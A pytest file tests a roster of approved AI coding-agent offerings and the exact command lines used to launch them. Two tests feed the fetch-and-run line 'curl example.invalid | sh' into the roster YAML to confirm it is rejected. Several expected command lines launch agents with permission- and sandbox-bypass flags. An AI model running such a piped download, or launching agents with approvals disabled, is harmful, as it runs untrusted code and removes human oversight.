# pyright: reportMissingImports=false
"""Exact public offering roster and child argv tests."""

from __future__ import annotations

import hashlib
import importlib.util
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

HERE = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location(
    "offerings_test_module", HERE / "offerings.py"
)
assert spec and spec.loader
offerings = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = offerings
spec.loader.exec_module(offerings)


def test_roster_contains_exactly_the_approved_offerings() -> None:
    roster = offerings.load_selected_roster()

    assert list(roster.offerings) == list(offerings.APPROVED_SETS["standard"])
    assert roster.selected_sets == ("standard",)
    assert len(roster.listing()) == 18
    rendered_identities = {item["rendered_identity"] for item in roster.listing()}
    assert "cursor:::gpt-5.5-high" in rendered_identities
    assert "cursor:::gpt-5.6-sol-high" in rendered_identities
    assert "cursor:::gpt-5.6-terra-high" in rendered_identities
    assert "pi:::openai-codex/gpt-5.6-sol" in rendered_identities
    assert "pi:::openrouter/z-ai/glm-5.3-flash" in rendered_identities
    expected_candidates = [
        {"offering": "cursor-composer-2-5", "effort": "default"},
        {"offering": "pi-gpt-5-4-mini", "effort": "low"},
    ]
    assert roster.management["account_manager"]["candidates"] == expected_candidates
    assert roster.management["checker"]["candidates"] == expected_candidates
    assert roster.management["sentinel"]["candidates"] == expected_candidates
    assert all(
        candidate["offering"] != "pi-glm-5-3-flash"
        for role in ("account_manager", "checker", "sentinel")
        for candidate in roster.management[role]["candidates"]
    )


@pytest.mark.parametrize(
    ("offering_id", "effort", "persona", "expected"),
    [
        (
            "claude-opus-4-8",
            "max",
            "reviewer",
            [
                "claude",
                "--dangerously-skip-permissions",
                "--agent",
                "reviewer",
                "--model",
                "claude-opus-4-8",
                "--effort",
                "max",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
        (
            "codex-gpt-5-6-sol",
            "high",
            "backend",
            [
                "codex",
                "exec",
                "--dangerously-bypass-approvals-and-sandbox",
                "--skip-git-repo-check",
                "--model",
                "gpt-5.6-sol",
                "-c",
                "model_reasoning_effort=high",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
        (
            "pi-gpt-5-6-sol",
            "xhigh",
            "backend",
            [
                "pi",
                "--approve",
                "--no-extensions",
                "-e",
                str(Path.home() / ".pi/agent/extensions/herdr-agent-state.ts"),
                "--model",
                "openai-codex/gpt-5.6-sol",
                "--thinking",
                "xhigh",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
        (
            "pi-glm-5-3-flash",
            "max",
            "backend",
            [
                "pi",
                "--approve",
                "--no-extensions",
                "-e",
                str(Path.home() / ".pi/agent/extensions/herdr-agent-state.ts"),
                "--model",
                "openrouter/z-ai/glm-5.3-flash",
                "--thinking",
                "max",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
    ],
)
def test_code_owned_renderer_emits_exact_tokens(
    offering_id: str, effort: str, persona: str, expected: list[str]
) -> None:
    snapshot = offerings.load_selected_roster().resolve(offering_id, effort)

    assert (
        offerings.render_argv(snapshot, persona, "/lease/instructions.md") == expected
    )


def test_every_approved_offering_and_effort_renders_without_yaml_commands() -> None:
    roster = offerings.load_selected_roster()

    for offering in roster.offerings.values():
        for effort in offering.efforts:
            argv = offerings.render_argv(
                offering.snapshot(effort), "backend", "/lease.md"
            )
            harness_binaries = {
                "claude": "claude",
                "codex": "codex",
                "pi": "pi",
                "cursor": "cursor-agent",
            }
            assert argv[0] == harness_binaries[offering.harness]
            if offering.harness == "pi":
                assert argv[argv.index("--model") + 1] == offering.model
                assert argv[argv.index("--thinking") + 1] == effort


def test_glm_offering_has_only_the_pi_catalog_supported_efforts(
    tmp_path: Path,
) -> None:
    roster = offerings.load_selected_roster()
    glm = roster.offerings["pi-glm-5-3-flash"]

    assert glm.efforts == ("low", "high", "max")
    for effort in ("medium", "xhigh"):
        with pytest.raises(offerings.OfferingError, match="does not allow effort"):
            roster.resolve(glm.offering_id, effort)

    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["offerings"][glm.offering_id]["efforts"] = [
        "low",
        "medium",
        "high",
        "max",
    ]
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="efforts must be exactly"):
        offerings.load_roster(path)


def test_cursor_offerings_have_only_default_effort() -> None:
    roster = offerings.load_selected_roster()
    cursor_offerings = [
        item for item in roster.offerings.values() if item.harness == "cursor"
    ]

    assert {item.offering_id for item in cursor_offerings} == {
        "cursor-composer-2-5",
        "cursor-grok-4-6",
        "cursor-opus-4-6",
        "cursor-sonnet-4-6",
        "cursor-fable-5",
        "cursor-gpt-5-5",
        "cursor-gpt-5-6-sol",
        "cursor-gpt-5-6-terra",
    }
    for cursor in cursor_offerings:
        assert cursor.efforts == (offerings.DEFAULT_EFFORT,)
        for effort in ("low", "medium", "high", "xhigh", "max"):
            with pytest.raises(offerings.OfferingError, match="does not allow effort"):
                roster.resolve(cursor.offering_id, effort)


def test_cursor_omitted_and_explicit_default_are_canonical() -> None:
    roster = offerings.load_selected_roster()

    for offering_id in (
        "cursor-composer-2-5",
        "cursor-grok-4-6",
        "cursor-opus-4-6",
        "cursor-sonnet-4-6",
        "cursor-fable-5",
        "cursor-gpt-5-5",
        "cursor-gpt-5-6-sol",
        "cursor-gpt-5-6-terra",
    ):
        omitted = roster.resolve(offering_id, None)
        explicit = roster.resolve(offering_id, "default")

        assert omitted == explicit
        assert omitted["selected_effort"] == "default"


def test_effortful_offering_still_requires_effort() -> None:
    roster = offerings.load_selected_roster()

    for offering_id in (
        "claude-sonnet-5",
        "codex-gpt-5-6-sol",
        "pi-gpt-5-6-sol",
        "pi-glm-5-3-flash",
    ):
        with pytest.raises(
            offerings.OfferingError, match="requires an explicit effort"
        ):
            roster.resolve(offering_id, None)


@pytest.mark.parametrize(
    ("offering_id", "model"),
    [
        ("cursor-composer-2-5", "composer-2.5"),
        ("cursor-grok-4-6", "cursor-grok-4.6-high"),
        ("cursor-opus-4-6", "claude-4.6-opus-high"),
        ("cursor-sonnet-4-6", "claude-4.6-sonnet-medium"),
        ("cursor-fable-5", "claude-fable-5-high"),
        ("cursor-gpt-5-5", "gpt-5.5-high"),
        ("cursor-gpt-5-6-sol", "gpt-5.6-sol-high"),
        ("cursor-gpt-5-6-terra", "gpt-5.6-terra-high"),
    ],
)
def test_cursor_renderer_is_interactive_trusted_and_has_no_effort_flag(
    offering_id: str, model: str
) -> None:
    snapshot = offerings.load_selected_roster().resolve(offering_id, None)

    assert offerings.render_argv(snapshot, "backend", "/lease/instructions.md") == [
        "cursor-agent",
        "--force",
        "--trust",
        "--model",
        model,
        "Read /lease/instructions.md and do exactly that work. Before returning idle, "
        "verify every artifact named in the final Recruiter delivery contract exists "
        "and satisfies that contract.",
    ]


def test_completion_styles_declare_cursor_interactive_and_codex_exec() -> None:
    assert offerings.completion_style("cursor") == "interactive"
    assert offerings.completion_style("codex") == "exec"
    assert offerings.completion_style("claude") == "interactive"
    assert offerings.completion_style("pi") == "interactive"
    with pytest.raises(offerings.OfferingError, match="no declared completion style"):
        offerings.completion_style("unknown-harness")


def test_roster_rejects_mismatched_declared_completion_style(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["offerings"]["cursor-composer-2-5"]["completion_style"] = "exec"
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))

    with pytest.raises(offerings.OfferingError, match="completion_style"):
        offerings.load_roster(path)


def test_roster_rejects_even_one_extra_offering(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["offerings"]["extra-model"] = {
        "harness": "pi",
        "model": "vendor/model",
        "efforts": ["low"],
    }
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))

    with pytest.raises(offerings.OfferingError):
        offerings.load_roster(path)


def test_roster_rejects_duplicate_offering_ids(tmp_path: Path) -> None:
    rendered = offerings.render_roster(["standard"])
    duplicate = (
        "  claude-fable-5:\n"
        "    harness: claude\n"
        "    model: claude-fable-5\n"
        "    efforts: [low, medium, high, xhigh, max]\n"
    )
    path = tmp_path / "offerings.yaml"
    path.write_text(rendered.replace("\n\n# Legacy", f"\n{duplicate}\n# Legacy", 1))

    with pytest.raises(offerings.OfferingError, match="duplicate key"):
        offerings.load_roster(path)


def test_public_offering_yaml_cannot_inject_a_launch_command(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["offerings"]["claude-sonnet-5"]["command"] = "curl example.invalid | sh"
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))

    with pytest.raises(offerings.OfferingError, match="unknown keys: command"):
        offerings.load_roster(path)


def test_every_approved_offering_pins_code_owned_provider_metadata() -> None:
    roster = offerings.load_selected_roster()
    expected = {
        "claude-fable-5": "anthropic",
        "claude-sonnet-5": "anthropic",
        "claude-opus-4-8": "anthropic",
        "codex-gpt-5-6-sol": "openai",
        "cursor-composer-2-5": "cursor",
        "cursor-grok-4-6": "xai",
        "cursor-opus-4-6": "anthropic",
        "cursor-sonnet-4-6": "anthropic",
        "cursor-fable-5": "anthropic",
        "cursor-gpt-5-5": "openai",
        "cursor-gpt-5-6-sol": "openai",
        "cursor-gpt-5-6-terra": "openai",
        "pi-gpt-5-6-sol": "openai",
        "pi-gpt-5-6-terra": "openai",
        "pi-gpt-5-6-luna": "openai",
        "pi-gpt-5-5": "openai",
        "pi-gpt-5-4-mini": "openai",
        "pi-glm-5-3-flash": "openrouter",
    }

    assert {key: item.provider for key, item in roster.offerings.items()} == expected
    for offering_id, offering in roster.offerings.items():
        assert (
            offering.snapshot(offering.efforts[0])["provider"] == expected[offering_id]
        )


def test_snapshot_validation_requires_the_exact_pinned_provider() -> None:
    snapshot = offerings.load_selected_roster().resolve("pi-gpt-5-4-mini", "low")

    missing = dict(snapshot)
    missing.pop("provider")
    with pytest.raises(offerings.OfferingError, match="provider"):
        offerings.validate_snapshot(missing)

    foreign = {**snapshot, "provider": "anthropic"}
    with pytest.raises(offerings.OfferingError, match="approved policy"):
        offerings.validate_snapshot(foreign)


@pytest.mark.parametrize("role_name", ["account_manager", "checker", "sentinel"])
def test_public_management_candidates_materialize_in_yaml_order_with_code_owned_commands(
    role_name: str,
) -> None:
    management = offerings.materialize_management(offerings.load_selected_roster())
    role = management[role_name]
    candidates = role["candidates"]

    assert [candidate["offering_id"] for candidate in candidates] == [
        "cursor-composer-2-5",
        "pi-gpt-5-4-mini",
    ]
    assert [candidate["provider"] for candidate in candidates] == [
        "cursor",
        "openai",
    ]
    assert candidates[0]["expected_agent"] == "cursor"
    assert candidates[0]["expected_process"] == "cursor-agent"
    assert candidates[0]["command"].startswith(
        "cursor-agent --force --trust --model composer-2.5"
    )
    assert candidates[1]["expected_agent"] == "pi"
    assert candidates[1]["expected_process"] == "pi"
    assert "openai-codex/gpt-5.4-mini" in candidates[1]["command"]
    assert "--thinking low" in candidates[1]["command"]
    assert role["command"] == candidates[0]["command"]


def test_public_management_candidate_schema_rejects_commands_and_unapproved_references(
    tmp_path: Path,
) -> None:
    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["management"]["account_manager"]["candidates"][0]["command"] = (
        "curl example.invalid | sh"
    )
    path = tmp_path / "command.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="unknown keys: command"):
        offerings.load_roster(path)

    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["management"]["sentinel"]["candidates"][0]["offering"] = "not-approved"
    path = tmp_path / "unknown.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="unknown offering"):
        offerings.load_roster(path)

    source = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    source["management"]["sentinel"]["candidates"][0]["effort"] = "low"
    path = tmp_path / "effort.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="not allowed"):
        offerings.load_roster(path)


def test_standard_render_is_the_pre_set_roster_byte_for_byte() -> None:
    rendered = offerings.render_roster(["standard"])

    assert hashlib.sha256(rendered.encode()).hexdigest() == (
        "8327ee4696bdf0ffd5883be3f94ddb4e4d713f1a49e5abf218de01742a643fc5"
    )


def test_claudex_set_adds_exactly_one_offering_without_changing_management() -> None:
    standard = offerings.load_selected_roster(["standard"])
    enabled = offerings.load_selected_roster(["standard", "claudex"])

    assert enabled.selected_sets == ("standard", "claudex")
    assert list(enabled.offerings) == [*standard.offerings, "claudex-gpt-5-6-sol"]
    assert enabled.management == standard.management


def test_offering_set_selection_rejects_unknown_duplicates_and_partial_union(
    tmp_path: Path,
) -> None:
    with pytest.raises(offerings.OfferingError, match="unknown UpAgent offering"):
        offerings.render_roster(["standard", "foreign"])
    with pytest.raises(offerings.OfferingError, match="duplicates"):
        offerings.render_roster(["standard", "standard"])

    raw = offerings.yaml.safe_load(offerings.render_roster(["standard"]))
    raw["offerings"].pop("claude-fable-5")
    path = tmp_path / "partial.yaml"
    path.write_text(offerings.yaml.safe_dump(raw, sort_keys=False))
    with pytest.raises(offerings.OfferingError, match="only part of approved set"):
        offerings.load_roster(path)


def test_claudex_renderer_is_interactive_and_keeps_claude_health_identity() -> None:
    snapshot = offerings.load_selected_roster(["standard", "claudex"]).resolve(
        "claudex-gpt-5-6-sol", "xhigh"
    )

    assert offerings.render_argv(snapshot, "backend", "/lease/instructions.md") == [
        "claudex",
        "gpt-5.6-sol",
        "--dangerously-skip-permissions",
        "--agent",
        "backend",
        "--effort",
        "xhigh",
        "Read /lease/instructions.md and do exactly that work.",
    ]
    assert offerings.completion_style("claudex") == "interactive"
    assert offerings.MANAGEMENT_HEALTH["claudex"] == ("claude", "claude")


def test_claudex_preflight_uses_only_code_owned_doctor_and_exact_model(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    snapshot = offerings.load_selected_roster(["standard", "claudex"]).resolve(
        "claudex-gpt-5-6-sol", "high"
    )
    calls: list[list[str]] = []

    monkeypatch.setattr(
        offerings.shutil,
        "which",
        lambda command: (
            f"/bin/{command}" if command in {"claudex", "claudex-doctor"} else None
        ),
    )

    def run(argv: list[str], **_kwargs: object) -> SimpleNamespace:
        calls.append(argv)
        return SimpleNamespace(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(offerings.subprocess, "run", run)

    result = offerings.preflight_snapshot(snapshot)

    assert calls == [["/bin/claudex-doctor", "gpt-5.6-sol"]]
    assert result["model"] == "gpt-5.6-sol"


def test_roster_resolution_prefers_repo_then_linked_main_then_home(
    tmp_path: Path,
) -> None:
    home = tmp_path / "home"
    home_roster = (
        home / ".shared-llm/generated/extensions/common/upagent/offerings.yaml"
    )
    home_roster.parent.mkdir(parents=True)
    home_roster.write_text(offerings.render_roster(["standard"]))

    main = tmp_path / "main"
    main.mkdir()
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=main, check=True)
    subprocess.run(
        ["git", "config", "user.email", "test@example.invalid"], cwd=main, check=True
    )
    subprocess.run(["git", "config", "user.name", "Test"], cwd=main, check=True)
    subprocess.run(
        ["git", "commit", "-q", "--allow-empty", "-m", "initial"], cwd=main, check=True
    )
    linked = tmp_path / "linked"
    subprocess.run(
        ["git", "worktree", "add", "-q", "-b", "linked", str(linked)],
        cwd=main,
        check=True,
    )
    main_roster = main / offerings.ROSTER_RELATIVE_PATH
    main_roster.parent.mkdir(parents=True)
    main_roster.write_text(offerings.render_roster(["standard", "claudex"]))

    assert offerings.resolve_roster_path(linked, home) == main_roster

    local_roster = linked / offerings.ROSTER_RELATIVE_PATH
    local_roster.parent.mkdir(parents=True)
    local_roster.write_text(offerings.render_roster(["standard"]))
    nested = linked / "nested"
    nested.mkdir()
    assert offerings.resolve_roster_path(nested, home) == local_roster

    outside = tmp_path / "outside"
    outside.mkdir()
    assert offerings.resolve_roster_path(outside, home) == home_roster


def test_roster_resolution_finds_main_checkout_from_bare_worktree(
    tmp_path: Path,
) -> None:
    home = tmp_path / "home"
    home_roster = (
        home / ".shared-llm/generated/extensions/common/upagent/offerings.yaml"
    )
    home_roster.parent.mkdir(parents=True)
    home_roster.write_text(offerings.render_roster(["standard", "claudex"]))

    source = tmp_path / "source"
    bare = tmp_path / "repo.git"
    main = tmp_path / "main"
    linked = tmp_path / "linked"
    source.mkdir()
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=source, check=True)
    subprocess.run(
        ["git", "config", "user.email", "test@example.invalid"], cwd=source, check=True
    )
    subprocess.run(["git", "config", "user.name", "Test"], cwd=source, check=True)
    subprocess.run(
        ["git", "commit", "-q", "--allow-empty", "-m", "initial"],
        cwd=source,
        check=True,
    )
    subprocess.run(["git", "clone", "--bare", str(source), str(bare)], check=True)
    subprocess.run(
        ["git", "--git-dir", str(bare), "worktree", "add", "-q", str(main), "main"],
        check=True,
    )
    subprocess.run(
        [
            "git",
            "--git-dir",
            str(bare),
            "worktree",
            "add",
            "-q",
            "-b",
            "linked",
            str(linked),
            "main",
        ],
        check=True,
    )
    main_roster = main / offerings.ROSTER_RELATIVE_PATH
    main_roster.parent.mkdir(parents=True)
    main_roster.write_text(offerings.render_roster(["standard"]))

    assert offerings.resolve_roster_path(linked, home) == main_roster


def test_claudex_preflight_failure_never_substitutes_native_claude(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    snapshot = offerings.load_selected_roster(["standard", "claudex"]).resolve(
        "claudex-gpt-5-6-sol", "high"
    )
    monkeypatch.setattr(
        offerings.shutil,
        "which",
        lambda command: (
            f"/bin/{command}" if command in {"claudex", "claudex-doctor"} else None
        ),
    )
    monkeypatch.setattr(
        offerings.subprocess,
        "run",
        lambda *_args, **_kwargs: subprocess.CompletedProcess(
            [],
            1,
            stdout="",
            stderr="proxy unavailable; model gpt-5.6-sol not advertised",
        ),
    )

    with pytest.raises(
        offerings.OfferingError, match="required model 'gpt-5.6-sol'.*proxy unavailable"
    ):
        offerings.preflight_snapshot(snapshot)
    assert offerings.render_argv(snapshot, "backend", "/lease.md")[0] == "claudex"
